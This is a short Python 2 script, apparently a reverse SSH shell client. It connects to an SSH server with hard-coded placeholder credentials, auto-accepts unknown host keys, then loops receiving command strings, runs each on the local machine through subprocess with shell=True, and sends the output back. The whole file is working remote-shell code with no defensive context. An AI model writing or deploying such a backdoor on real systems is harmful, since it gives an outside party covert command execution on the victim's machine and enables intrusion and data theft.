# -*- encoding: utf-8 -*-


import threading
import paramiko
import subprocess
import logging


logging.basicConfig()


def ssh_command(ip, user, passwd, cmd):
    client = paramiko.SSHClient()

#    client.load_host_keys('/home/unknown/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(cmd)
        
        print ssh_session.recv(1024)

        while True:
            cmd_rcv = ssh_session.recv(1024)

            try:
                cmd_out = subprocess.check_output(cmd_rcv, shell=True)

                ssh_session.send(cmd_out)
            except Exception, err:
                ssh_session.send(str(err))

        client.close()

    return


ssh_command('127.0.0.1', 'username', 'passwd', 'ClientConnected')


